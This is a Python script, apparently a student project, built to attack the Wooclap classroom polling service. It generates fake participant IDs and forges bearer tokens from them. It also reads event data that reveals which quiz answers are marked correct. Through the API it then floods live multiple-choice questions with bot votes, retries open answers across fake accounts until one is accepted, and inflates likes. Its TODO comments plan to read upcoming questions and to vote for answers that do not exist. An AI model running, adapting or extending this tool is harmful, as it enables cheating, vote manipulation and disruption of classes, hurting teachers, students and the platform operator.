# _TODO list:
#.Connaitre les questions suivantes
#.Voter réponses qui existent pas

import requests
import random
import os

def generate_users(n):
    return [random.randint(100000000000, 999999999999) for _ in range(n)]

def get_wooclap_headers(user_id):
    return {
        'authority': 'app.wooclap.com',
        'accept': 'application/json',
        'authorization': f'bearer z{user_id}',
        'content-type': 'application/json',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

def get_event_data(event_code, user_id):
    headers = get_wooclap_headers(user_id)
    params = {'isParticipant': 'true'}
    response = requests.get(f'https://app.wooclap.com/api/events/{event_code}', params=params, headers=headers)
    return response.json()

def add_users(users, n):
    return users + generate_users(n)

def attack_mcq_question(question, users):
    choices = []
    print(f"______QCM______\n\nQuestion: {question['title']}")
    for i, choice in enumerate(question['choices'], start=1):
        print(f"[{i}] {choice['choice']} [Correct: {choice['isCorrect']}]")

    if question['multipleChoice']:
        print("\nThis is a multiple-choice question. To select several answers, answer like this: '0+2'.")
        answer = input("Which answer(s) do you want to respond?\n> ").split('+')
        choices = [question['choices'][int(r)-1]['_id'] for r in answer]
    else:
        answer = int(input("Which answer do you want to respond?\n> "))
        choices = [question['choices'][answer-1]['_id']]

    #Prend au maximum le nombre de bots dans la liste
    spam_number = min(int(input(f"How many of them do you want to spam (max: {len(users)})?\n> ")), len(users))

    for i in range(spam_number):
        headers = get_wooclap_headers(users[i])
        json_data = {'choices': choices, 'comment': '', 'token': f'z{users[i]}'}
        response = requests.post(f'https://app.wooclap.com/api/questions/{question["_id"]}/push_answer', headers=headers, json=json_data)

def attack_open_question(question, users):
    headers = get_wooclap_headers(users[0])
    print(f"______Open question______\n\nTitle: {question['title']}")
    if question['allExpectedAnswers']:
        print(f"Expected answers: {question['allExpectedAnswers']}")
    answer = input("What do you want to answer?\n> ")

    json_data = {'text': answer, 'image': None}
    answer_response = requests.post(f'https://app.wooclap.com/api/questions/{question["_id"]}/push_answer', headers=headers, json=json_data)

    while answer_response.status_code == 403:
        for user_id in users:
            headers = get_wooclap_headers(user_id)
            json_data = {'text': answer, 'image': None}
            answer_response = requests.post(f'https://app.wooclap.com/api/questions/{question["_id"]}/push_answer', headers=headers, json=json_data)
            if answer_response.status_code == 200:
                break

    answer_response = answer_response.json()

    if question['canLike']:
        number_of_likes = min(int(input(f"How many likes do you want to your answer? (max: {len(users)})\n> ")), len(users))
        for i in range(number_of_likes):
            headers = get_wooclap_headers(users[i])
            json_data = {'toggle': True}
            response = requests.post(f'https://app.wooclap.com/api/questions/{question["_id"]}/answers/{answer_response["userAnswer"]["_id"]}/toggle_like', headers=headers, json=json_data)

number_of_users = int(input("How many users do you want to create?\n> "))
list_of_users = generate_users(number_of_users)

event_code = input("What is the event code of the Wooclap?\n> ")

max_user = False

while True:
    os.system('cls||clear')
    print("################ MENU ################\n")
    if max_user:
        print("NOTE: All your bots have ever answered to the previous question")
    print("[1] Attack the question")
    print("[2] Add new users (Current: {})".format(len(list_of_users)))
    print("[3] Change the event code (Current: {})".format(event_code))
    print("[4] EXIT")
    choice = int(input("> "))

    if choice == 2:
        add_numb = int(input("How many users do you want to add?\n> "))
        list_of_users = add_users(list_of_users, add_numb)
        continue
    elif choice == 3:
        event_code = input("What is the event code of the Wooclap?\n> ")
        continue
    elif choice == 4:
        os.system('cls||clear')
        break

    os.system('cls||clear')

    headers = get_wooclap_headers(list_of_users[0])
    data = get_event_data(event_code, list_of_users[0])
    number_of_questions = len(data["questions"])
    id_in_number = 0

    #Si il n'arrive pas à trouver une question sélectionnée, il revient au menu 
    try:
        for i in range(number_of_questions):
            if data["questions"][i]["_id"] == data["selectedQuestion"]:
                break
            id_in_number += 1
        question = data["questions"][id_in_number]
    except:
        continue

    if question["__t"] == "MCQ":
        attack_mcq_question(question, list_of_users)
    elif question["__t"] == "OpenQuestion":
        attack_open_question(question, list_of_users)